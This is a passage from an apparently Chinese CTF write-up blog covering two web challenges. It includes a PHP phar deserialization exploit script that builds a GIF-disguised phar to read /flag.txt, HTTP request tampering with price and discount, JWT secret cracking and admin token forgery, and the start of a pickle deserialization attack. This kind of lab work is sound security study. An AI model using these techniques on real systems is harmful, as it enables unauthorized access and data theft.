.&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;</span><br><span class=\"line\">            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        echo $table;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class File &#123;</span><br><span class=\"line\">    public $filename;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function open($filename) &#123;</span><br><span class=\"line\">        $this-&gt;filename &#x3D; $filename;</span><br><span class=\"line\">        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class=\"line\">            return true;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function name() &#123;</span><br><span class=\"line\">        return basename($this-&gt;filename);  &#x2F;&#x2F;返回路径中的文件名部分</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function size() &#123;</span><br><span class=\"line\">        $size &#x3D; filesize($this-&gt;filename);</span><br><span class=\"line\">        $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);</span><br><span class=\"line\">        for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;</span><br><span class=\"line\">        return round($size, 2).$units[$i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function detele() &#123;</span><br><span class=\"line\">        unlink($this-&gt;filename);  &#x2F;&#x2F;删除文件</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function close() &#123;</span><br><span class=\"line\">        return file_get_contents($this-&gt;filename);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;login.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">if (isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class=\"line\">    header(&quot;Location: index.php&quot;);</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!doctype html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">  &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">  &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, shrink-to-fit&#x3D;no&quot;&gt;</span><br><span class=\"line\">  &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class=\"line\">  &lt;title&gt;登录&lt;&#x2F;title&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;!-- Bootstrap core CSS --&gt;</span><br><span class=\"line\">  &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;style&gt;</span><br><span class=\"line\">    .bd-placeholder-img &#123;</span><br><span class=\"line\">      font-size: 1.125rem;</span><br><span class=\"line\">      text-anchor: middle;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @media (min-width: 768px) &#123;</span><br><span class=\"line\">      .bd-placeholder-img-lg &#123;</span><br><span class=\"line\">        font-size: 3.5rem;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &lt;&#x2F;style&gt;</span><br><span class=\"line\">  &lt;!-- Custom styles for this template --&gt;</span><br><span class=\"line\">  &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;std.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body class&#x3D;&quot;text-center&quot;&gt;</span><br><span class=\"line\">  &lt;form class&#x3D;&quot;form-signin&quot; action&#x3D;&quot;login.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class=\"line\">    &lt;h1 class&#x3D;&quot;h3 mb-3 font-weight-normal&quot;&gt;登录&lt;&#x2F;h1&gt;</span><br><span class=\"line\">    &lt;label for&#x3D;&quot;username&quot; class&#x3D;&quot;sr-only&quot;&gt;Username&lt;&#x2F;label&gt;</span><br><span class=\"line\">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Username&quot; required autofocus&gt;</span><br><span class=\"line\">    &lt;label for&#x3D;&quot;password&quot; class&#x3D;&quot;sr-only&quot;&gt;Password&lt;&#x2F;label&gt;</span><br><span class=\"line\">    &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Password&quot; required&gt;</span><br><span class=\"line\">    &lt;button class&#x3D;&quot;btn btn-lg btn-primary btn-block&quot; type&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class=\"line\">    &lt;p class&#x3D;&quot;mt-5 text-muted&quot;&gt;还没有账号? &lt;a href&#x3D;&quot;register.php&quot;&gt;注册&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;</span><br><span class=\"line\">    &lt;p class&#x3D;&quot;text-muted&quot;&gt;&amp;copy; 2018-2019&lt;&#x2F;p&gt;</span><br><span class=\"line\">  &lt;&#x2F;form&gt;</span><br><span class=\"line\">  &lt;div class&#x3D;&quot;top&quot; id&#x3D;&quot;toast-container&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;bootstrap.bundle.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;toast.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">include &quot;class.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_GET[&#39;register&#39;])) &#123;</span><br><span class=\"line\">    echo &quot;&lt;script&gt;toast(&#39;注册成功&#39;, &#39;info&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;</span><br><span class=\"line\">    $u &#x3D; new User();</span><br><span class=\"line\">    $username &#x3D; (string) $_POST[&quot;username&quot;];</span><br><span class=\"line\">    $password &#x3D; (string) $_POST[&quot;password&quot;];</span><br><span class=\"line\">    if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123;</span><br><span class=\"line\">        $_SESSION[&#39;login&#39;] &#x3D; true;</span><br><span class=\"line\">        $_SESSION[&#39;username&#39;] &#x3D; htmlentities($username);</span><br><span class=\"line\">        $sandbox &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SESSION[&#39;username&#39;] . &quot;sftUahRiTz&quot;) . &quot;&#x2F;&quot;;</span><br><span class=\"line\">        if (!is_dir($sandbox)) &#123;</span><br><span class=\"line\">            mkdir($sandbox);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $_SESSION[&#39;sandbox&#39;] &#x3D; $sandbox;</span><br><span class=\"line\">        echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;);</span><br><span class=\"line\">        die();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    echo &quot;&lt;script&gt;toast(&#39;账号或密码错误&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>在class.php中，File::close()可以读取到文件内容</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">File</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $filename;</span><br><span class=\"line\"></span><br><span class=\"line\">    ...</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">close</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;filename);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>User类中的析构函数中有执行close()函数过程</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $db;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> $db;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;db = $db;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    ...</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;db-&gt;close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>而FileList类中没有close()函数，但是如果调用FileList类中的close（）,就会调用到File类中的close()。从而获取flag的内容</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FileList</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $files;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $results;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $funcs;</span><br><span class=\"line\">    </span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($path)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;files = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;results = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;funcs = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        $filenames = scandir($path);</span><br><span class=\"line\"></span><br><span class=\"line\">        $key = array_search(<span class=\"string\">\".\"</span>, $filenames);</span><br><span class=\"line\">        <span class=\"keyword\">unset</span>($filenames[$key]);   <span class=\"comment\">//销毁变量</span></span><br><span class=\"line\">        $key = array_search(<span class=\"string\">\"..\"</span>, $filenames);</span><br><span class=\"line\">        <span class=\"keyword\">unset</span>($filenames[$key]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($filenames <span class=\"keyword\">as</span> $filename) &#123;</span><br><span class=\"line\">            $file = <span class=\"keyword\">new</span> File();</span><br><span class=\"line\">            $file-&gt;open($path . $filename);</span><br><span class=\"line\">            array_push(<span class=\"keyword\">$this</span>-&gt;files, $file);</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;results[$file-&gt;name()] = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span><span class=\"params\">($func, $args)</span> </span>&#123;  <span class=\"comment\">//调用本类不存在的方法，将方法添加到funcs数组中，并将file类中的</span></span><br><span class=\"line\">        array_push(<span class=\"keyword\">$this</span>-&gt;funcs, $func);   </span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"keyword\">$this</span>-&gt;files <span class=\"keyword\">as</span> $file) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"[https://www.cnblogs.com/20175211lyz/p/11403397.html#%E5%85%ADphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96](https://www.cnblogs.com/20175211lyz/p/11403397.html#六phar反序列化)\">关于php反序列化</a>在刷题记录11当中也有两篇关于phar的文章<a href=\"https://paper.seebug.org/680/\" target=\"_blank\" rel=\"noopener\">参考文章1</a>     <a href=\"https://xz.aliyun.com/t/2958\" target=\"_blank\" rel=\"noopener\">参考文章2</a></p>\n<p>重点在class.php，delete.php，和download.php中</p>\n<p>在delete.php、download.php中file_exists会触发phar反序列化漏洞，但是在download.php有设置open_basedir，而delete.php中没有，所以选择delete.php</p>\n<p>编写生成phar的脚本</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $db;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">File</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $filename;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FileList</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $files;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $results;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $funcs;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $file = <span class=\"keyword\">new</span> File();</span><br><span class=\"line\">        $file-&gt;filename=<span class=\"string\">\"/flag.txt\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;files=<span class=\"keyword\">array</span>($file);</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Implement __destruct() method.</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$test = <span class=\"keyword\">new</span> User();</span><br><span class=\"line\">$test-&gt;db = <span class=\"keyword\">new</span> FileList();</span><br><span class=\"line\">$phar = <span class=\"keyword\">new</span> Phar(<span class=\"string\">'s.phar'</span>);</span><br><span class=\"line\">$phar-&gt;startBuffering();</span><br><span class=\"line\">$phar-&gt;setStub(<span class=\"string\">\"GIF89a __HALT_COMPILER();\"</span>);</span><br><span class=\"line\">$phar-&gt;setMetadata($test);</span><br><span class=\"line\">$phar-&gt;addFromString(<span class=\"string\">'a'</span>,<span class=\"string\">'a'</span>);</span><br><span class=\"line\">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>\n\n<p>将生成的s.phar改后缀为gif，上传，在删除s.gif时，抓包修改filename为<code>phar://s.gif</code></p>\n<p><img src=\"/pic/74.png\" alt=\"\"></p>\n<h2 id=\"华北赛区-Day1-Web2-ikun\"><a href=\"#华北赛区-Day1-Web2-ikun\" class=\"headerlink\" title=\"华北赛区 Day1 Web2 ikun\"></a>华北赛区 Day1 Web2 ikun</h2><p>打开题目有注册界面，先注册，登入</p>\n<p>回到首页发现要买到LV6</p>\n<p><img src=\"/pic/75.png\" alt=\"\"></p>\n<p>在第181页找到了LV6点击购买</p>\n<p><img src=\"/pic/76.png\" alt=\"\"></p>\n<p>抓包发现有一个价格，有一个折扣</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/shopcar</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 106</span><br><span class=\"line\"><span class=\"attribute\">Origin</span>: http://c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn/shopcar</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: _xsrf=2|578fed8a|97f2448968d2a525b9b0490c07c3413f|1581661272; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78; commodity_id=\"2|1:0|10:1581662353|12:commodity_id|8:MTYyNA==|e3649aa3872d333d61bd8b14770c0c7ca9c0539d9263777c505ebe2ac3e7e15f\"</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"></span><br><span class=\"line\">_xsrf=2%7C83e3992c%7C439e302fbcbed1836ddc3daad3af3599%7C1581661272&amp;id=1624&amp;price=1145141919.0&amp;discount=0.8</span><br></pre></td></tr></table></figure>\n\n<p>把价格改成很小发现出错，把折扣改小出现新界面提示需要admin才能访问</p>\n<p><img src=\"/pic/77.png\" alt=\"\"></p>\n<p><img src=\"/pic/78.png\" alt=\"\"></p>\n<p>查看cookie，其中有一个JWT、_xsrf、commodity_id</p>\n<p><a href=\"https://blog.csdn.net/hekewangzi/article/details/72885670\" target=\"_blank\" rel=\"noopener\">关于JWT</a>   去jwt.io解析一下</p>\n<p><img src=\"/pic/79.png\" alt=\"\"></p>\n<p>使用的是HS256（HMAC SHA256对称加密）算法</p>\n<p>使用c-jwt-cracker破解成功，密钥为1Kun</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:~/tools/c-jwt-cracker<span class=\"comment\"># ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78</span></span><br><span class=\"line\">Secret is <span class=\"string\">\"1Kun\"</span></span><br></pre></td></tr></table></figure>\n\n<p>回到<a href=\"https://jwt.io/#debugger修改username为admin，在下方填入密钥1Kun\" target=\"_blank\" rel=\"noopener\">https://jwt.io/#debugger修改username为admin，在下方填入密钥1Kun</a></p>\n<p><img src=\"/pic/80.png\" alt=\"\">  </p>\n<p>然后修改cookie为<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</code></p>\n<p><img src=\"/pic/81.png\" alt=\"\">  </p>\n<p>点击页面无反应，查看源码，发现了一个WWW.ZIP</p>\n<p><img src=\"/pic/82.png\" alt=\"\">  </p>\n<p>打开发现是tornado的框架</p>\n<p>既然PHP有序列化漏洞，python也有，通过pickle模块实现 [参考文章]（<a href=\"https://www.jianshu.com/p/8fd3de5b4843）\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/8fd3de5b4843）</a></p>\n<p>在sshop/view/Admin.py中含有序列化漏洞</p>\n<p><img src=\"/pic/83.png\" alt=\"\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> tornado.web</span><br><span class=\"line\"><span class=\"keyword\">from</span> sshop.base <span class=\"keyword\">import</span> BaseHandler</span><br><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AdminHandler</span><span class=\"params\">(BaseHandler)</span>:</span></span><br><span class=\"line\"><span class=\"meta\">    @tornado.web.authenticated</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(self, *args, **kwargs)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.current_user == <span class=\"string\">\"admin\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.render(<span class=\"string\">'form.html'</span>, res=<span class=\"string\">'This is Black Technology!'</span>, member=<span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.render(<span class=\"string\">'no_ass.html'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">    @tornado.web.authenticated</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">post</span><span class=\"params\">(self, *args, **kwargs)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            become = self.get_argument(<span class=\"string\">'become'</span>)</span><br><span 